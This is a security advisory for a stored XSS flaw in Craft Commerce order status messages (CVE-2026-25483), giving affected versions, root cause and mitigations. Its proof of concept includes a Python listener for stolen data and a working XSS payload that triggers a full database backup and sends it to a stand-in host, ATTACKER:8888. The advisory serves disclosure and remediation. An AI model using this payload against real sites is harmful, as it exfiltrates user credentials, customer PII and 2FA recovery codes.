# [M] Craft Commerce has Stored XSS via Order Status Message with potential database exfiltration

## Summary
Severity: Medium
Advisory: GHSA-8478-rmjg-mjj5
CVE: CVE-2026-25483
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:H/SI:L/SA:N (CVSS_V4)
Published: 2026-02-02
Source: https://github.com/advisories/GHSA-8478-rmjg-mjj5
Type: github-advisory

## Affected
- Packagist: `craftcms/commerce` — affected >=5.0.0 <5.5.2
- Packagist: `craftcms/commerce` — affected >=4.0.0-RC1 <4.10.1

## Details
## Summary

A stored XSS vulnerability exists in Craft Commerce’s Order Status History Message. The message is rendered using the `|md` filter, which permits raw HTML, enabling malicious script execution. If a user has database backup utility permissions (which do not require an elevated session), an attacker can exfiltrate the entire database, including all user credentials, customer PII, order history, and 2FA recovery codes.

Users are recommended to update to the patched 5.5.2 release to mitigate the issue.

---
## Proof of Concept

### Required Permissions

- General
	- Access the control panel
	- Access Craft Commerce
	- Access to the database backup utility
- Craft Commerce
	- Manage orders
	- Edit orders

### Attacker Server Setup

To reproduce this attack, you need a server to receive the exfiltrated database.
1. Save the Python script as `receiver.py` on your attacker machine.
2. Run it: `python3 receiver.py` -- Change the port if needed.

<details>

<summary>Server Python Script</summary>

```python
#!/usr/bin/env python3
"""
Usage: python3 receiver.py
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi, os
from datetime import datetime

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST')
        self.end_headers()

    def do_POST(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        content_type = self.headers.get('Content-Type', '')
        if 'multipart/form-data' in content_type:
            form = cgi.FieldStorage(
                fp=self.rfile, headers=self.headers,
                environ={'REQUEST_METHOD': 'POST', 'CONTENT_TYPE': content_type}
            )
            if 'db' in form:
                filename = f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql.zip"
                with open(filename, 'wb') as f:
                    f.write(form['db'].file.read())
                print(f"[+] DB saved: {filename} ({os.path.getsize(filename):,} bytes)")
        
        self.wfile.write(b"OK")

if __name__ == '__main__':
    print("[*] Listening on http://0.0.0.0:8888")   # change the port if needed
    HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

</details>

### Steps to Reproduce

1. Log in to the admin panel
2. Navigate to **Commerce** → **Orders**
3. Create a new order, enter a customer email, and mark the order as completed. The Order should be saved now; if not, save it.
4. Edit the order
5. Change the order status, a new text field (Status Message) will appear once the status is changed
    - Make sure you have multiple order statuses; if not, create one from (/admin/commerce/settings/orderstatuses)
6. In the **Status Message** field, enter the XSS payload below
7. Save/Update the order
8. Log out & log in again with an admin account
9. Visit the order page (/admin/commerce/orders/{Order_ID})
10. XSS executes → Full database backup is triggered and exfiltrated
11. Go back to the attacker’s server and notice a zipped file containing the full exfiltrated database.

### XSS Payload (DB Exfiltration)

**Note:** Replace `ATTACKER:8888` with your listener server.
```html
<img src=x onerror="fetch('/index.php?p=admin/actions/utilities/db-backup-perform-action',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=utilities/db-backup-perform-action&CRAFT_CSRF_TOKEN='+Craft.csrfTokenValue+'&downloadBackup=1'}).then(r=>r.blob()).then(b=>{let f=new FormData;f.append('db',b,'backup.sql');fetch('http://ATTACKER:8888/',{method:'POST',body:f})})">
```

---
## Technical Details (Vulnerable Code)

**File:** `vendor/craftcms/commerce/src/templates/orders/_history.twig`
**Sink:** `{{ orderHistory.message | md }}`
**Root Cause:** The `|md` Twig filter (Markdown) processes the message but does not sanitize HTML tags.

---
## Impact

The exfiltrated database backup includes, but is not limited to:
- Usernames, emails, and password hashes.
- Customer PII: Names, addresses, and complete order history.
- Transaction records, customer profiles, and coupon codes.
- GraphQL tokens.
- 2FA recovery codes.
- Potentially, payment gateway secrets (if stored directly instead of using environment variables).

**Note:** This XSS can also be leveraged for the same attacks described in previous reports, including privilege escalation and forced password changes.

---
## Mitigation

Sanitize the message before rendering:
```twig
{{ orderHistory.message | md | purify }}
```

Or escape HTML before Markdown processing:
```twig
{{ orderHistory.message | e | md }}
```

Additionally, requiring an elevated session for the DB Backup utility would increase the difficulty of exploitation, although it would not prevent the attack, as it might occur while an active elevated session is in place.

## Resources:

https://github.com/craftcms/commerce/commit/4665a47c0961aee311a42af2ff94a7c470f0ad8c

## References
- https://github.com/craftcms/commerce/security/advisories/GHSA-8478-rmjg-mjj5
- https://nvd.nist.gov/vuln/detail/CVE-2026-25483
- https://github.com/craftcms/commerce/commit/4665a47c0961aee311a42af2ff94a7c470f0ad8c
- https://github.com/craftcms/commerce
- https://github.com/craftcms/commerce/releases/tag/4.10.1
- https://github.com/craftcms/commerce/releases/tag/5.5.2
